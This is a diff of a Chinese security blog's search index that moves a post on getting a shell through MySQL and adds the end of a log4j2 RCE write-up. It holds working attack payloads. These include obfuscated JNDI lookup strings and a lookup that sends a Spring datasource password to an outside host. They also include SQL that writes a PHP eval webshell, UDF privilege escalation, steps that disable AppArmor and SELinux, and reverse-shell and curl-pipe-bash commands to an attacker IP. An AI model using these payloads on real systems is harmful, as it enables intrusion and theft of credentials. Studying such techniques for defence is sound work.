+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;lower:$&#123;p0melo:-j&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;p0melo:-$&#123;lower:J&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123221821111.png" class="" title="image-20220123221821111">
+
+<h3 id="Bundle外带"><a href="#Bundle外带" class="headerlink" title="Bundle外带"></a><strong>Bundle外带</strong></h3><p>方法来自<a class="link"   href="https://b1ue.cn/archives/513.html" >浅蓝师傅博客<i class="fas fa-external-link-alt"></i></a> ，还可以使用Bundle获取特殊变量值并外带，spring环境下可以尝试获取</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//jndi.fuzz.red:5/ku8r/$&#123;bundle:application:spring.datasource.password&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220302220853565.png" class="" title="image-20220302220853565">
+]]></content>
+      <tags>
+        <tag>漏洞分析</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ysoserial URLDNS分析</title>
     <url>/2022/02/24/ysoserial-URLDNS%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习p牛的《java安全漫谈》，文中许多简化版易于理解的demo，根据对demo的理解结合<code>ysoserial</code>源码学习java反序列化，对<code>ysoserial</code>源码分析过程做下记录，本文先记录下URLDNS的分析过程，后续再继续学习记录所有CC链的分析过程，冲冲冲。</p>
@@ -740,6 +740,85 @@
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>URLDNS调试起来简单清晰，确实比较适合像我这种入门级选手初次调试反序列流程，URLDNS只能触发DNS请求，并不能说是一个利用链，所以通常用URLDNS来判断是否存在反序列化漏洞。</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524" >《Java安全漫谈 - 08.认识最简单的Gadget——URLDNS》<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   href="https://github.com/frohoff/ysoserial" >ysoserial项目<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>通过mysql获取shell的几种方法</title>
+    <url>/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="0x01-利用outfile函数写shell"><a href="#0x01-利用outfile函数写shell" class="headerlink" title="0x01 利用outfile函数写shell"></a>0x01 利用outfile函数写shell</h2><p><strong>条件</strong></p>
+<p>1.当前数据库用户为root权限</p>
+<p>2.secure-file-priv为空（或包含web目录）</p>
+<p>3.已知网站的绝对路径且具有写的权限</p>
+<p><strong>利用步骤</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php  @eval($_POST[1]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;;</span><br><span class="line">#当然也可以insert到表后再select 表 into outfile到php文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-利用dumpfile函数进行udf提权"><a href="#0x02-利用dumpfile函数进行udf提权" class="headerlink" title="0x02 利用dumpfile函数进行udf提权"></a>0x02 利用dumpfile函数进行udf提权</h2><p><strong>条件</strong></p>
+<p>1.root权限执行的Mysql</p>
+<p>2.secure_file_priv为空（或包含udf目录）</p>
+<p>3.udf目录具有写权限</p>
+<p><strong>利用步骤</strong></p>
+<p>从sqlmap或msf选择适合目标系统的udf脚本，保存解码并hex后的文件内容（解码步骤参考<a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E8%AF%A5udf.dll(.so)%E6%96%87%E4%BB%B6%E7%9A%8416%E8%BF%9B%E5%88%B6%E5%80%BC(hex)">小知识点</a>)）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>; #查看udf允许的目录</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name                 <span class="operator">|</span> <span class="keyword">Value</span>                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> default_authentication_plugin <span class="operator">|</span> mysql_native_password  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> plugin_dir                    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> unhex(<span class="string">&#x27;udf.so hex code&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/shell.so&#x27;</span>; #windows为dll，linux为so文件</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> string soname <span class="string">&#x27;shell.so&#x27;</span>; #这里的so文件不能加绝对路径</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> func; #查看已创建的用户自定义函数</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl         <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> shell.so   <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>); #返回<span class="keyword">NULL</span>说明执行成功了，这里使用的sqlmap自带的udf脚本是不带回显的</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure>
+
+<p>当lib/plugin目录不存在时可以使用NTFS ADS流创建lib、plugin文件夹</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@basedir;   &#x2F;&#x2F;查找mysql的目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    &#x2F;&#x2F;使用NTFS ADS流创建lib目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;; &#x2F;&#x2F;利用NTFS ADS再次创建plugin目录</span><br><span class="line">执行成功以后再进行导出即可。</span><br></pre></td></tr></table></figure>
+
+<p><strong>udf实验过程遇到的坑点</strong></p>
+<ol>
+<li><p>受到secure_file_priv的目录限制，该默认目录与udf插件的目录不一样，导致dumpfile失败</p>
+<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221223977.png" class="" title="image-20210131221223977">
+
+<p>通过修改/etc/mysql/mysql.conf.d/mysqld.cnf文件secure_file_priv为空</p>
+</li>
+<li><p>没有写的权限</p>
+<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221824261.png" class="" title="image-20210131221824261">
+
+<p>unbutu通过<code>service apparmor teardown</code>关闭apparmor安全模式，并设置/usr/lib/mysql/plugin权限为777</p>
+<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131223336103.png" class="" title="image-20210131223336103"></li>
+</ol>
+<p>若是centos ，修改<code>/etc/sysconfig/selinux</code>文件<code>SELINUX=disabled</code>来禁用安全模式</p>
+<p>3.将绝对路径导致so文件找不到，去掉路径即可</p>
+<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620172930780.png" class="" title="image-20210620172930780">
+
+<h2 id="0x03-开启全局日志写入shell"><a href="#0x03-开启全局日志写入shell" class="headerlink" title="0x03 开启全局日志写入shell"></a>0x03 开启全局日志写入shell</h2><p>前两个利用方法都受到secure_file_priv的限制，我们可以通过全局日志或慢查询日志写shell绕过该限制</p>
+<p><strong>条件</strong></p>
+<p>1.root权限执行的Mysql</p>
+<p>2.网站的绝对路径且具有写入权限</p>
+<p><strong>利用步骤</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>; #开启全局配置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/WWW/shell.php&#x27;</span>; #将日志文件设置成服务器下的木马文件</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>; #执行<span class="keyword">sql</span>语句，mysql会将我没执行的语句记录到日志文件(上一步修改后的文件)中</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-开启慢查询日志写入shell"><a href="#0x04-开启慢查询日志写入shell" class="headerlink" title="0x04 开启慢查询日志写入shell"></a>0x04 开启慢查询日志写入shell</h2><p><strong>条件</strong></p>
+<p>1.root权限执行的Mysql</p>
+<p>2.网站的绝对路径且具有写入权限</p>
+<p><strong>利用步骤</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%slow_query_log%&#39;; #查看慢查询日志开启情况</span><br><span class="line">set global slow_query_log&#x3D;1; #开启慢查询日志</span><br><span class="line">set global slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;; #修改日志文件存储的绝对路径</span><br><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; or sleep(11); #向日志文件中写入shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-利用system函数反弹shell"><a href="#0x05-利用system函数反弹shell" class="headerlink" title="0x05 利用system函数反弹shell"></a>0x05 利用system函数反弹shell</h2><p>mysql在5.7版本之后自带有个system函数，可以直接执行命令</p>
+<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620180803889.png" class="" title="image-20210620180803889">
+
+<p><strong>条件</strong></p>
+<p>1.mysql版本大于5.7</p>
+<p><strong>利用步骤</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64编码后反弹</span><br><span class="line">system bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDIvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;;</span><br><span class="line">#利用curl访问攻击者web服务器，shell.html内容为bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">system curl 192.168.112.142&#x2F;shell.html|bash;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-小知识点"><a href="#0x06-小知识点" class="headerlink" title="0x06 小知识点"></a>0x06 小知识点</h2><h3 id="secure-file-priv在不同mysql版本的区别"><a href="#secure-file-priv在不同mysql版本的区别" class="headerlink" title="secure_file_priv在不同mysql版本的区别"></a><strong>secure_file_priv在不同mysql版本的区别</strong></h3><p>mysql5.5之前secure_file_priv默认是空，这个情况可以让任何绝对路径写文件，</p>
+<p>mysql5.5-5.7，secure_file_priv默认是NULL，限制mysqld 不允许导入 | 导出，</p>
+<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131155508820.png" class="" title="image-20210131155508820">
+
+<p>mysql版本5.7之后，secure_file_priv是默认目录,限制mysqld 的导入 | 导出 只能发生在限定目录下。</p>
+<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131152927985.png" class="" title="image-20210131152927985">
+
+<h3 id="如何获取该udf-dll-so-文件的16进制值-hex"><a href="#如何获取该udf-dll-so-文件的16进制值-hex" class="headerlink" title="如何获取该udf.dll(.so)文件的16进制值(hex)"></a><strong>如何获取该udf.dll(.so)文件的16进制值(hex)</strong></h3><p>我们可以本地搭建mysql环境 找个可以用的udf.dll文件 执行下面操作</p>
+<p>mysql&gt; select hex(load_file (‘c:/windows/temp/xxoo.dll’)) into outfile ‘c:/windows/temp/xxoo.txt’;</p>
+<h3 id="sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码"><a href="#sqlmap的udf-dll-so-是通过异或编码的，使用之前需要解码" class="headerlink" title="sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码"></a><strong>sqlmap的udf.dll(.so)是通过异或编码的，使用之前需要解码</strong></h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#解码工具为sqlmap自带的SQLmap\extra\cloak\cloak.py</span></span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\windows\<span class="number">64</span>\lib_mysqludf_sys.dll_</span><br><span class="line">python cloak.py <span class="literal">-d</span> <span class="literal">-i</span> G:\tools\SQLmap\udf\mysql\linux\<span class="number">64</span>\lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131161956660.png" class="" title="image-20210131161956660">
+
+<h3 id="dumpfile和outfile有什么不一样"><a href="#dumpfile和outfile有什么不一样" class="headerlink" title="dumpfile和outfile有什么不一样"></a><strong>dumpfile和outfile有什么不一样</strong></h3><p>outfile适合导库，会在行末尾会写入新行并转义，因此不能写入二进制可执行文件。</p>
+<p>into dumpfile 就能导出 一个完整能执行的2进制文件。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.cnblogs.com/sijidou/p/10522972.html" >udf提权<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/weixin_39872872/article/details/112589789" >写入mysql_通过MySQL写入webshell的几种方式<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.cnblogs.com/milantgh/p/5444398.html" >mysql dumpfile与outfile函数的区别<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
   </entry>
   <entry>
@@ -841,85 +920,6 @@
 
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://space.bilibili.com/2919428/channel/seriesdetail?sid=1006553&ctype=0" >课程视频<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   href="https://pascal-group.bitbucket.io/teaching.html" >课件<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>通过mysql获取shell的几种方法</title>
-    <url>/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="0x01-利用outfile函数写shell"><a href="#0x01-利用outfile函数写shell" class="headerlink" title="0x01 利用outfile函数写shell"></a>0x01 利用outfile函数写shell</h2><p><strong>条件</strong></p>
-<p>1.当前数据库用户为root权限</p>
-<p>2.secure-file-priv为空（或包含web目录）</p>
-<p>3.已知网站的绝对路径且具有写的权限</p>
-<p><strong>利用步骤</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php  @eval($_POST[1]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;;</span><br><span class="line">#当然也可以insert到表后再select 表 into outfile到php文件</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x02-利用dumpfile函数进行udf提权"><a href="#0x02-利用dumpfile函数进行udf提权" class="headerlink" title="0x02 利用dumpfile函数进行udf提权"></a>0x02 利用dumpfile函数进行udf提权</h2><p><strong>条件</strong></p>
-<p>1.root权限执行的Mysql</p>
-<p>2.secure_file_priv为空（或包含udf目录）</p>
-<p>3.udf目录具有写权限</p>
-<p><strong>利用步骤</strong></p>
-<p>从sqlmap或msf选择适合目标系统的udf脚本，保存解码并hex后的文件内容（解码步骤参考<a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E8%AF%A5udf.dll(.so)%E6%96%87%E4%BB%B6%E7%9A%8416%E8%BF%9B%E5%88%B6%E5%80%BC(hex)">小知识点</a>)）</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>; #查看udf允许的目录</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name                 <span class="operator">|</span> <span class="keyword">Value</span>                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> default_authentication_plugin <span class="operator">|</span> mysql_native_password  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> plugin_dir                    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> unhex(<span class="string">&#x27;udf.so hex code&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/shell.so&#x27;</span>; #windows为dll，linux为so文件</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> string soname <span class="string">&#x27;shell.so&#x27;</span>; #这里的so文件不能加绝对路径</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> func; #查看已创建的用户自定义函数</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl         <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> shell.so   <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>); #返回<span class="keyword">NULL</span>说明执行成功了，这里使用的sqlmap自带的udf脚本是不带回显的</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure>
-
-<p>当lib/plugin目录不存在时可以使用NTFS ADS流创建lib、plugin文件夹</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select @@basedir;   &#x2F;&#x2F;查找mysql的目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    &#x2F;&#x2F;使用NTFS ADS流创建lib目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;; &#x2F;&#x2F;利用NTFS ADS再次创建plugin目录</span><br><span class="line">执行成功以后再进行导出即可。</span><br></pre></td></tr></table></figure>
-
-<p><strong>udf实验过程遇到的坑点</strong></p>
-<ol>
-<li><p>受到secure_file_priv的目录限制，该默认目录与udf插件的目录不一样，导致dumpfile失败</p>
-<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221223977.png" class="" title="image-20210131221223977">
-
-<p>通过修改/etc/mysql/mysql.conf.d/mysqld.cnf文件secure_file_priv为空</p>
-</li>
-<li><p>没有写的权限</p>
-<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221824261.png" class="" title="image-20210131221824261">
-
-<p>unbutu通过<code>service apparmor teardown</code>关闭apparmor安全模式，并设置/usr/lib/mysql/plugin权限为777</p>
-<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131223336103.png" class="" title="image-20210131223336103"></li>
-</ol>
-<p>若是centos ，修改<code>/etc/sysconfig/selinux</code>文件<code>SELINUX=disabled</code>来禁用安全模式</p>
-<p>3.将绝对路径导致so文件找不到，去掉路径即可</p>
-<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620172930780.png" class="" title="image-20210620172930780">
-
-<h2 id="0x03-开启全局日志写入shell"><a href="#0x03-开启全局日志写入shell" class="headerlink" title="0x03 开启全局日志写入shell"></a>0x03 开启全局日志写入shell</h2><p>前两个利用方法都受到secure_file_priv的限制，我们可以通过全局日志或慢查询日志写shell绕过该限制</p>
-<p><strong>条件</strong></p>
-<p>1.root权限执行的Mysql</p>
-<p>2.网站的绝对路径且具有写入权限</p>
-<p><strong>利用步骤</strong></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>; #开启全局配置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/WWW/shell.php&#x27;</span>; #将日志文件设置成服务器下的木马文件</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>; #执行<span class="keyword">sql</span>语句，mysql会将我没执行的语句记录到日志文件(上一步修改后的文件)中</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x04-开启慢查询日志写入shell"><a href="#0x04-开启慢查询日志写入shell" class="headerlink" title="0x04 开启慢查询日志写入shell"></a>0x04 开启慢查询日志写入shell</h2><p><strong>条件</strong></p>
-<p>1.root权限执行的Mysql</p>
-<p>2.网站的绝对路径且具有写入权限</p>
-<p><strong>利用步骤</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%slow_query_log%&#39;; #查看慢查询日志开启情况</span><br><span class="line">set global slow_query_log&#x3D;1; #开启慢查询日志</span><br><span class="line">set global slow_query_log_file&#x3D;&#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;; #修改日志文件存储的绝对路径</span><br><span class="line">select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39; or sleep(11); #向日志文件中写入shell</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x05-利用system函数反弹shell"><a href="#0x05-利用system函数反弹shell" class="headerlink" title="0x05 利用system函数反弹shell"></a>0x05 利用system函数反弹shell</h2><p>mysql在5.7版本之后自带有个system函数，可以直接执行命令</p>
-<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210620180803889.png" class="" title="image-20210620180803889">
-
-<p><strong>条件</strong></p>
-<p>1.mysql版本大于5.7</p>
-<p><strong>利用步骤</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#base64编码后反弹</span><br><span class="line">system bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xNDIvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;;</span><br><span class="line">#利用curl访问攻击者web服务器，shell.html内容为bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br><span class="line">system curl 192.168.112.142&#x2F;shell.html|bash;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x06-小知识点"><a href="#0x06-小知识点" class="headerlink" title="0x06 小知识点"></a>0x06 小知识点</h2><h3 id="secure-file-priv在不同mysql版本的区别"><a href="#secure-file-priv在不同mysql版本的区别" class="headerlink" title="secure_file_priv在不同mysql版本的区别"></a><strong>secure_file_priv在不同mysql版本的区别</strong></h3><p>mysql5.5之前secure_file_priv默认是空，这个情况可以让任何绝对路径写文件，</p>
-<p>mysql5.5-5.7，secure_file_priv默认是NULL，限制mysqld 不允许导入 | 导出，</p>
-<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131155508820.png" class="" title="image-20210131155508820">
-
-<p>mysql版本5.7之后，secure_file_priv是默认目录,限制mysqld 的导入 | 导出 只能发生在限定目录下。</p>
-<img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131152927985.png" class="" title="image-20210131152927985">
-
-<h3 id="如何获取该udf-dll-so-文件的16进制值-hex"><a href="#如何获取该udf-dll-so-文件的16进制值-hex" class="headerlink" title="如何获取该udf.dll(.so)文件的16进制值(hex)"></a><strong>如何获取该udf.dll(.so)文件的16进制值(hex)</strong></h3><p>我们可以本地搭建mysql环境 找个可以用的udf.dll文件 执行下面操作</p>
-<p>mysql&gt; select hex(load_file (‘c:/windows/temp/xxoo.dll’)) into outfile ‘c:/windows/temp/xxoo.txt’;</p>
